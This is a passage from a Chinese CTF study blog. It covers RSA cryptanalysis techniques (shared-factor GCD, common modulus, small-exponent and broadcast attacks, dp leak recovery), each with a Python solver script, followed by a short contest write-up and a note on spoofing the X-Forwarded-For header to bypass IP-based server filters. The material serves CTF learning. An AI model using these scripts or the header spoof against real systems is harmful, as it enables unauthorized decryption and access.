<p>识别此类题目，通常会发现题目给了若干个n，均不相同，并且都是2048bit，4096bit级别，无法直接分解<a target="_blank" rel="noopener" href="http://www.factordb.com/index.php%EF%BC%8C%E5%B9%B6%E4%B8%94%E6%98%8E%E6%96%87%E9%83%BD%E6%B2%A1%E4%BB%80%E4%B9%88%E8%81%94%E7%B3%BB%EF%BC%8Ce%E4%B9%9F%E4%B8%80%E8%88%AC%E5%8F%9665537%E3%80%82">http://www.factordb.com/index.php，并且明文都没什么联系，e也一般取65537。</a></p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/1999159-20200712082911929-729980764.png"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">#-*-coding:utf-8-*-</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">求两个数的最大公约数</span><br><span class="line">算法参考:https:&#x2F;&#x2F;zhidao.baidu.com&#x2F;question&#x2F;36550887.html</span><br><span class="line">by:reborn</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">import gmpy2</span><br><span class="line">n1&#x3D;</span><br><span class="line">n2&#x3D;</span><br><span class="line">def gys1(n1,n2):    #辗转相除法(欧几里德算法)</span><br><span class="line">    if n1&lt;n2:</span><br><span class="line">        n1,n2&#x3D;n2,n1</span><br><span class="line">    while n2!&#x3D;0:</span><br><span class="line">        temp&#x3D;n1%n2</span><br><span class="line">        n1&#x3D;n2</span><br><span class="line">        n2&#x3D;temp</span><br><span class="line">    return n1</span><br><span class="line">def gys2(n1,n2):    #更相减损法</span><br><span class="line">    while n1!&#x3D;n2:</span><br><span class="line">        if n1&lt;n2:</span><br><span class="line">            n1,n2&#x3D;n2,n1</span><br><span class="line">        temp&#x3D;n1-n2</span><br><span class="line">        n1&#x3D;temp</span><br><span class="line">    return n1</span><br><span class="line">p&#x3D;gys2(n1,n2)</span><br><span class="line">print (&quot;p&#x3D;&quot;,p)</span><br><span class="line"></span><br><span class="line">#求q1,q2</span><br><span class="line"></span><br><span class="line">q1&#x3D;n1&#x2F;&#x2F;p</span><br><span class="line">q2&#x3D;n2&#x2F;&#x2F;p</span><br><span class="line">print(&quot;q1&#x3D;&quot;,q1)</span><br><span class="line">print(&quot;q2&#x3D;&quot;,q2)</span><br><span class="line"></span><br><span class="line">#求d_1,d_2</span><br><span class="line"></span><br><span class="line">p0 &#x3D; gmpy2.mpz(p)#初始化大整数</span><br><span class="line">q_1 &#x3D; gmpy2.mpz(q1)</span><br><span class="line">q_2 &#x3D; gmpy2.mpz(q2)</span><br><span class="line">e &#x3D; gmpy2.mpz(65537)</span><br><span class="line">r_1 &#x3D; (p0-1)*(q_1-1)</span><br><span class="line">r_2 &#x3D; (p0-1)*(q_2-1)</span><br><span class="line">d_1 &#x3D; gmpy2.invert(e,r_1)  # invert（e，r）返回d使得e * d &#x3D;&#x3D; 1 mod r，如果不存在d，则返回0</span><br><span class="line">d_2 &#x3D; gmpy2.invert(e,r_2)</span><br><span class="line">print(&quot;d_1&#x3D;&quot;,d_1)</span><br><span class="line">print(&quot;d_2&#x3D;&quot;,d_2)</span><br><span class="line"></span><br><span class="line"># 求c1,c2</span><br><span class="line"></span><br><span class="line">c1&#x3D;</span><br><span class="line">c2&#x3D;</span><br><span class="line">m1 &#x3D; pow(c1, d_1, n1)</span><br><span class="line">m2 &#x3D; pow(c2, d_2, n2)</span><br><span class="line">print(&quot;m1&#x3D;&quot;,m1)</span><br><span class="line">print(&quot;m2&#x3D;&quot;,m2)</span><br></pre></td></tr></table></figure>

<p>根据<code>欧几里德算法</code>算出的<code>p</code>之后，再用<code>n</code>除以<code>p</code>即可求出<code>q</code>，由此可以得到的参数有<code>p</code>、<code>q</code>、<code>n</code>、<code>e</code>，再使用常规方法计算出<code>d</code>，即可破解密文。</p>
<p>m = pow(c, d, N),可以得到明文m</p>
<hr>
<p><strong>共模攻击</strong></p>
<p>如果在RSA的使用中使用了相同的模n对相同的明文m进行了加密，那么就可以在不分解n的情况下还原出明文m的值。</p>
<blockquote>
<p>c1 = m^e1 mod n<br> c2 = m^e2 mod n</p>
</blockquote>
<p>识别：非常简单，若干次加密，每次n都一样，明文根据题意也一样即可。</p>
<hr>
<p><strong>已知私钥文件、c求m</strong></p>
<p>题目中给出了私钥文件private.pem和flag.enc</p>
<p>pem文件通常是包含了—–BEGIN PRIVATE KEY—–和—–END PRIVATE KEY—–，是 Base64 编码的二进制内容<br> 使用私钥解密密文的方式</p>
<p>使用openssl工具<br> 利用如下命令：</p>
<blockquote>
<p>rsautl -decrypt -in flag.enc(密文名称) -inkey private.pem</p>
</blockquote>
<hr>
<p><strong>已知公钥文件、c求m</strong></p>
<p>题目中给出了public.pem和密文flag.enc</p>
<blockquote>
<p>openssl rsa -pubin -text -modulus -in warmup -in pubkey.pem<br> ​     [提取出pubkey.pem中的参数]</p>
</blockquote>
<blockquote>
<p>得到n，化为十进制</p>
</blockquote>
<blockquote>
<p>将n分解为P，q</p>
</blockquote>
<blockquote>
<p>python rsatool.py -o private.pem -e 65537 -p 275127860351348928173285174381581152299 -q 319576316814478949870590164193048041239</p>
<p>[使用rsatool生成私钥文件: private.pem]</p>
</blockquote>
<blockquote>
<p>openssl rsautl -decrypt -in flag.enc -inkey private.pem</p>
</blockquote>
<hr>
<p><strong>低加密指数攻击</strong></p>
<p>在RSA中e也称为加密指数。由于e是可以随意选取的，选取小一点的e可以缩短加密时间，但是选取不当的话，就会造成安全问题。</p>
<p><strong>e=3时的小明文攻击</strong></p>
<p>当e=3时，如果明文过小，导致明文的三次方仍然小于n，那么通过直接对密文三次开方，即可得到明文。</p>
<blockquote>
<p>(1)m3&lt;n,也就是说m3=c;<br> (2)m3&gt;n，即(m3+kn)mod n=c（爆破k，不知道k取什么值）。</p>
</blockquote>
<ul>
<li>第一种情况   根据 <code>c = pow(m, e, N) </code>可知：</li>
</ul>
<p>当e=3时，如果明文过小，导致<strong>明文的三次方</strong>仍然小于n，那么通过直接对密文三次开方，即可得到明文。</p>
<ul>
<li>第二种情况  如果<strong>明文的三次方</strong>比n大，但是不够大，那么设k，有：    c=(m^3+kn)mod n</li>
</ul>
<p>爆破k，如果（c-kn）能开三次根式，那么可以直接得到明文。</p>
<p><strong>识别：</strong></p>
<p>推荐在e=3的时候首先尝试这种方法。</p>
<blockquote>
<p>openssl  rsa  -pubin  -in  pubkey.pem  （读取公钥内容）<br> openssl  rsa   -pubin  in  pubkey.pem -text（以文本格式输出公钥内容),从这一步可以知道e的值</p>
</blockquote>
<p>从而判断为低加密指数攻击</p>
<hr>
<p><strong>低加密指数广播攻击</strong></p>
<p>低加密指数广播攻击，即如果选取的加密指数较低，并且使用了相同的加密指数给一个接收者发送了相同的信息（或者给一群接收者发送了相同的信息），那么可以进行广播攻击得到明文。</p>
<p>假如我们需要将一份明文进行多份加密，但是每份使用不同的密钥，密钥中的模数n不同但指数e相同且很小，我们只要拿到多份密文和对应的n就可以利用<a target="_blank" rel="noopener" href="https://www.cnblogs.com/freinds/p/6388992.html">中国剩余定理</a>进行解密。</p>
<p><strong>适用</strong></p>
<p>只要满足以下情况，我们就可以考虑实用低加密指数广播攻击：</p>
<blockquote>
<p>1.加密指数e非常小<br> 2.一份明文使用不同的模数n，相同的加密指数e进行多次加密<br> 3.可以拿到每一份加密后的密文和对应的模数n、加密指数e</p>
</blockquote>
<p>低加密指数广播攻击脚本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"># coding:utf8</span><br><span class="line"></span><br><span class="line">from struct import pack,unpack</span><br><span class="line">import zlib</span><br><span class="line">import gmpy</span><br><span class="line">def my_parse_number(number):</span><br><span class="line">    string &#x3D; &quot;%x&quot; % number</span><br><span class="line">    #if len(string) !&#x3D; 64:</span><br><span class="line">    #    return &quot;&quot;</span><br><span class="line">    erg &#x3D; []</span><br><span class="line">    while string !&#x3D; &#39;&#39;:</span><br><span class="line">        erg &#x3D; erg + [chr(int(string[:2], 16))]</span><br><span class="line">        string &#x3D; string[2:]</span><br><span class="line">    return &#39;&#39;.join(erg)</span><br><span class="line">def extended_gcd(a, b):</span><br><span class="line">    x,y &#x3D; 0, 1</span><br><span class="line">    lastx, lasty &#x3D; 1, 0</span><br><span class="line">    while b:</span><br><span class="line">        a, (q, b) &#x3D; b, divmod(a,b)</span><br><span class="line">        x, lastx &#x3D; lastx-q*x, x</span><br><span class="line">        y, lasty &#x3D; lasty-q*y, y</span><br><span class="line">    return (lastx, lasty, a)</span><br><span class="line">def chinese_remainder_theorem(items):</span><br><span class="line">  N &#x3D; 1</span><br><span class="line">  for a, n in items:</span><br><span class="line">    N *&#x3D; n</span><br><span class="line">  result &#x3D; 0</span><br><span class="line">  for a, n in items:</span><br><span class="line">    m &#x3D; N&#x2F;n</span><br><span class="line">    r, s, d &#x3D; extended_gcd(n, m)</span><br><span class="line">    if d !&#x3D; 1:</span><br><span class="line">      N&#x3D;N&#x2F;n</span><br><span class="line">      continue</span><br><span class="line">      #raise &quot;Input not pairwise co-prime&quot;</span><br><span class="line">    result +&#x3D; a*s*m</span><br><span class="line">  return result % N, N</span><br><span class="line">  &#x2F;&#x2F;中国剩余定理 ， 输入多组c和多组n，以及较小的指数e</span><br><span class="line">sessions&#x3D;[</span><br><span class="line">&#123;&quot;c&quot;: , &quot;e&quot;: , &quot;n&quot;: &#125;,</span><br><span class="line">&#123;&quot;c&quot;: , &quot;e&quot;: , &quot;n&quot;: &#125;,</span><br><span class="line">&#123;&quot;c&quot;: , &quot;e&quot;: , &quot;n&quot;: &#125;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">data &#x3D; []</span><br><span class="line">for session in sessions:</span><br><span class="line">    e&#x3D;session[&#39;e&#39;]</span><br><span class="line">    n&#x3D;session[&#39;n&#39;]</span><br><span class="line">    msg&#x3D;session[&#39;c&#39;]</span><br><span class="line">    data &#x3D; data + [(msg, n)]</span><br><span class="line">print &quot;Please wait, performing CRT&quot;</span><br><span class="line">x, n &#x3D; chinese_remainder_theorem(data)</span><br><span class="line">e&#x3D;session[&#39;e&#39;]</span><br><span class="line">realnum &#x3D; gmpy.mpz(x).root(e)[0].digits()</span><br><span class="line">print my_parse_number(int(realnum))</span><br></pre></td></tr></table></figure>

<hr>
<p><strong>n可以分解为多个素数</strong></p>
<p>使用公钥加密和使用私钥解密流程（中国剩余定理）：<br> 准备<br> 首先，我们需要在在生成私钥公钥时，多生成几个数：<br> 我们的d是e对phi(n)的逆元，我们现在需要另外2个逆元（分别是对(p-1)和(q-1)的），既<br> 1：计算dp，使得dp * e = 1 mod(p-1)<br> 2：计算dq，使得dq * e = 1 mod(q-1)<br> 此外需要第三个元素，既q对p的逆元<br> 3：计算qInv，使得qInv * q = 1 mod p<br> ​        1 2 3 都作为私钥的一部分。</p>
<blockquote>
<p>dp = d mod p-1<br> dq = d mod q-1</p>
</blockquote>
<p><strong>计算：</strong></p>
<p>使用公钥加密：<br> 若要加密明文m,则需要计算c = m^e mod n，c为密文。</p>
<p>使用私钥解密：<br> 1:m1=c^dp mod p<br> 2:m2=c^dq mod q<br> 3:h= (qInv*((m1 - m2)mod p)) mod p<br> 4:m = m2 + h*q<br> m就是明文。</p>
<p>例：n=17947<br> ​           e=3<br> ​           c=8363<br> ​           m=???</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">n&#x3D;17947</span><br><span class="line">p&#x3D;137</span><br><span class="line">q&#x3D;131</span><br><span class="line">e&#x3D;3</span><br><span class="line">c&#x3D;8363</span><br><span class="line">dp&#x3D;gmpy2.invert(e,p-1)</span><br><span class="line">dq&#x3D;gmpy2.invert(e,q-1)</span><br><span class="line">m1&#x3D;pow(c,dp,p)</span><br><span class="line">m2&#x3D;pow(c,dq,q)</span><br><span class="line">qInv&#x3D;gmpy2.invert(q,p)</span><br><span class="line">h&#x3D;(qInv*((m1-m2)% p)) % p</span><br><span class="line">m&#x3D;m2+h*q</span><br><span class="line">print(m)</span><br></pre></td></tr></table></figure>

<p><strong>多素数</strong></p>
<p>例:n=p1<em>p2</em>p3=2279269<br> ​     p1=137<br> ​     p2=131<br> ​     p3=127<br> ​     e=19</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">预先计算:</span><br><span class="line">dp &#x3D; 19^-1 mod 137-1 &#x3D; 43</span><br><span class="line">dq &#x3D; 19^-1 mod 131-1 &#x3D; 89</span><br><span class="line">dr &#x3D; 19^-1 mod 127-1 &#x3D; 73</span><br><span class="line"></span><br><span class="line">若要解密密文 768924，则先计算</span><br><span class="line">1:m1&#x3D;768924^43 mod 137 &#x3D; 102</span><br><span class="line">2:m2&#x3D;768924^89 mod 131 &#x3D; 120</span><br><span class="line">3:m3&#x3D;768924^73 mod 127 &#x3D; 5</span><br><span class="line"></span><br><span class="line">等式1与等式2连列方程组计算：</span><br><span class="line">qInv &#x3D; 114</span><br><span class="line">h &#x3D; (qInv*((m1 - m2)mod p)) mod p &#x3D; 3</span><br><span class="line">m12 &#x3D; m2 + h*q &#x3D; 120 + 3*131 &#x3D; 513</span><br><span class="line"></span><br><span class="line">所以等式1与等式2的通用解为：513+k1*(131*137)</span><br><span class="line">所以结合等式3问题可以变为：</span><br><span class="line">m1&#x3D;513  p&#x3D;17947</span><br><span class="line">m2&#x3D;5    q&#x3D;127</span><br><span class="line">qInv*q≡ 1 mod p    ——&gt;qInv&#x3D;10316</span><br><span class="line">h &#x3D; (10316*((513 - 5)mod 17947)) mod 17947 &#x3D;4</span><br><span class="line">m &#x3D; 5 + 4*127 &#x3D; 513</span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p>jiaoben</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">n&#x3D;2279269</span><br><span class="line">p1&#x3D;137</span><br><span class="line">p2&#x3D;131</span><br><span class="line">p3&#x3D;127</span><br><span class="line">e&#x3D;19</span><br><span class="line">c&#x3D;768924</span><br><span class="line">dp1&#x3D;gmpy2.invert(e,p1-1)</span><br><span class="line">dp2&#x3D;gmpy2.invert(e,p2-1)</span><br><span class="line">dp3&#x3D;gmpy2.invert(e,p3-1)</span><br><span class="line">m1&#x3D;pow(c,dp1,p1)</span><br><span class="line">m2&#x3D;pow(c,dp2,p2)</span><br><span class="line">m3&#x3D;pow(c,dp3,p3)</span><br><span class="line">qInv1&#x3D;gmpy2.invert(p2,p1)</span><br><span class="line">h1&#x3D;(qInv1*((m1-m2) % p1)) % p1</span><br><span class="line">m4&#x3D;m2+h1*p2</span><br><span class="line">p4&#x3D;p1*p2</span><br><span class="line">qInv2&#x3D;gmpy2.invert(p3,p4)</span><br><span class="line">h2&#x3D;(qInv2*((m4-m3)% p4)) % p4</span><br><span class="line">m&#x3D;m3+h2*p3</span><br><span class="line">print(m)</span><br></pre></td></tr></table></figure>

<hr>
<p><strong>dp、dq泄露</strong></p>
<blockquote>
<p>dp = d mod p-1<br> dq = d mod q-1</p>
</blockquote>
<p>这种参数是为了让解密的时候更快速而产生的</p>
<p>已知p,q,dp,dq,c求m</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">import binascii</span><br><span class="line">import libnum</span><br><span class="line">def decrypt(dp,dq,p,q,c):</span><br><span class="line">    InvQ &#x3D; gmpy2.invert(q,p)</span><br><span class="line">    mp &#x3D; pow(c,dp,p)</span><br><span class="line">    mq &#x3D; pow(c,dq,q)                   #求幂取模运算</span><br><span class="line">    m&#x3D;(((mp-mq)*InvQ)%p)*q+mq          #求明文公式</span><br><span class="line">    print (binascii.unhexlify(hex(m)[2:]))</span><br><span class="line">    print(libnum.n2s(m))</span><br><span class="line">p &#x3D; </span><br><span class="line">q &#x3D; </span><br><span class="line">dp &#x3D; </span><br><span class="line">dq &#x3D; </span><br><span class="line">c &#x3D; </span><br><span class="line">decrypt(dp,dq,p,q,c)</span><br></pre></td></tr></table></figure>

<p><strong>已知e,n,dp,c求m</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">import libnum</span><br><span class="line">import binascii</span><br><span class="line">def getd(n,e,dp):</span><br><span class="line">    for i in range(1,e):            #在范围(1,e)之间进行遍历</span><br><span class="line">        if (dp*e-1)%i &#x3D;&#x3D; 0:</span><br><span class="line">            if n%(((dp*e-1)&#x2F;i)+1)&#x3D;&#x3D;0:    #存在p，使得n能被p整除</span><br><span class="line">                p&#x3D;((dp*e-1)&#x2F;i)+1</span><br><span class="line">                q&#x3D;n&#x2F;(((dp*e-1)&#x2F;i)+1)</span><br><span class="line">                phi &#x3D; (p-1)*(q-1)         #欧拉定理</span><br><span class="line">                d &#x3D; gmpy2.invert(e,phi)%phi        #求模逆</span><br><span class="line">                return d</span><br><span class="line">e &#x3D;</span><br><span class="line">n &#x3D; </span><br><span class="line">dp &#x3D; </span><br><span class="line">c &#x3D; </span><br><span class="line">d&#x3D;getd(n,e,dp)</span><br><span class="line">m&#x3D;pow(c,d,n)                            #快速求幂取模运算</span><br><span class="line">print(binascii.unhexlify(hex(m)[2:]))       #16进制转文本</span><br><span class="line">print(libnum.n2s(m))</span><br></pre></td></tr></table></figure>



<hr>
<p><strong>已知n,r求p,q</strong></p>
<p>核心是通过n和r解出p和q</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1.二分法，求得p，q</span><br><span class="line"></span><br><span class="line">2.RSATool2v17中，输入p，q，r，e，得到d  (脚本也可)</span><br><span class="line"></span><br><span class="line">3.通过m&#x3D;pow(c,d,n)</span><br><span class="line">注意：有时题目有要求，解出的可能是m乘上某一个参数，这是需要仔细审题</span><br><span class="line"></span><br><span class="line">4.转字符，得到flag</span><br></pre></td></tr></table></figure>

<p>脚本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">import numpy as np</span><br><span class="line">np.set_printoptions(suppress&#x3D;True)</span><br><span class="line"></span><br><span class="line">n&#x3D;gmpy2.mpz(14057332139537395701238463644827948204030576528558543283405966933509944444681257521108769303999679955371474546213196051386802936343092965202519504111238572269823072199...)</span><br><span class="line">r&#x3D;gmpy2.mpz(14057332139537395701238463644827948204030576528558543283405966933509944444681257521108769303999679955371474546213196051386802936343092965202519504111238572269823072199...)</span><br><span class="line"></span><br><span class="line">c1&#x3D;n-r+1</span><br><span class="line">print (c1)</span><br><span class="line"></span><br><span class="line">l&#x3D;c1&#x2F;2</span><br><span class="line">r&#x3D;c1</span><br><span class="line">#p&#x3D;(l+r)&#x2F;2</span><br><span class="line">#y&#x3D;p*(c1-p)</span><br><span class="line"></span><br><span class="line">while l&lt;r:</span><br><span class="line">	p&#x3D;(l+r)&#x2F;2</span><br><span class="line">	y&#x3D;p*(c1-p)</span><br><span class="line">	if y&#x3D;&#x3D;n:</span><br><span class="line">		print (p)</span><br><span class="line">		break</span><br><span class="line">	if y&gt;n:</span><br><span class="line">		print (y&gt;n)</span><br><span class="line">		l&#x3D;p</span><br><span class="line">	else:</span><br><span class="line">		print (y&lt;n)</span><br><span class="line">		r&#x3D;p</span><br><span class="line">		print (&quot;done&quot;)</span><br><span class="line">q&#x3D;c1-p</span><br><span class="line">print q</span><br><span class="line">&#x2F;*</span><br><span class="line">if p&gt;q:</span><br><span class="line">    p,q&#x3D;q,p</span><br><span class="line">factor2 &#x3D; 2021 * p + 2020 * q</span><br><span class="line">if factor2 &lt; 0:</span><br><span class="line">    factor2 &#x3D; (-1) * factor2</span><br><span class="line">    </span><br><span class="line">_P&#x3D;sympy.nextprime(factor2)</span><br><span class="line">*&#x2F;</span><br></pre></td></tr></table></figure>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://ggken753.github.io/2020/11/25/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B07/" data-id="ckhytgorg00005kv3f15wav1t" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-海啸杯wp" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/11/19/%E6%B5%B7%E5%95%B8%E6%9D%AFwp/" class="article-date">
  <time datetime="2020-11-19T03:22:41.167Z" itemprop="datePublished">2020-11-19</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/11/19/%E6%B5%B7%E5%95%B8%E6%9D%AFwp/">海啸杯wp</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="一-表白"><a href="#一-表白" class="headerlink" title="一.表白"></a>一.表白</h3><p>解压安装包得到flag.png,用winhex打开flag.png,将头文件的参数，得到flag</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201119075027408.png"></p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201119012005398.png"></p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201119012027585.png"></p>
<h3 id="二-小明家的小菜园"><a href="#二-小明家的小菜园" class="headerlink" title="二.小明家的小菜园"></a>二.小明家的小菜园</h3><p>复制字符串在CTFCarkTools打开，本题考查栅栏密码，对字符串进行解码得到flag</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201119013023029.png"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://ggken753.github.io/2020/11/19/%E6%B5%B7%E5%95%B8%E6%9D%AFwp/" data-id="ckhpm2jio0001ckv3d31r0340" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-学习笔记6" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/11/17/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B06/" class="article-date">
  <time datetime="2020-11-17T14:26:56.017Z" itemprop="datePublished">2020-11-17</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/11/17/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B06/">漏洞</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="XFF漏洞（X-Forwarded-For）"><a href="#XFF漏洞（X-Forwarded-For）" class="headerlink" title="XFF漏洞（X-Forwarded-For）"></a>XFF漏洞（X-Forwarded-For）</h2><h3 id="•什么是XFF漏洞"><a href="#•什么是XFF漏洞" class="headerlink" title="•什么是XFF漏洞"></a>•什么是XFF漏洞</h3><p>*XFF是header请求头中的一个参数<br> 是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段。<br> 代表了HTTP的请求端真实的IP。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: client1, proxy1, proxy2, proxy3</span><br><span class="line">&#x2F;&#x2F;浏览器IP，第一个代理服务器，第二个三个四个等等</span><br></pre></td></tr></table></figure>

<h3 id="•利用方法"><a href="#•利用方法" class="headerlink" title="•利用方法"></a>•利用方法</h3><h5 id="1-绕过服务器过滤"><a href="#1-绕过服务器过滤" class="headerlink" title="1.绕过服务器过滤"></a>1.绕过服务器过滤</h5><p>​         XFF漏洞也称为IP欺骗。<br> 有些服务器通过XFF头判断是否是本地服务器，当判断为本地服务器时，才能访问相关内容。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">X-Forwarded-For: 192.168.1.1</span><br></pre></td></tr></table></figure>

<p>修改XFF头的信息，即可绕过服务器的过滤。</p>
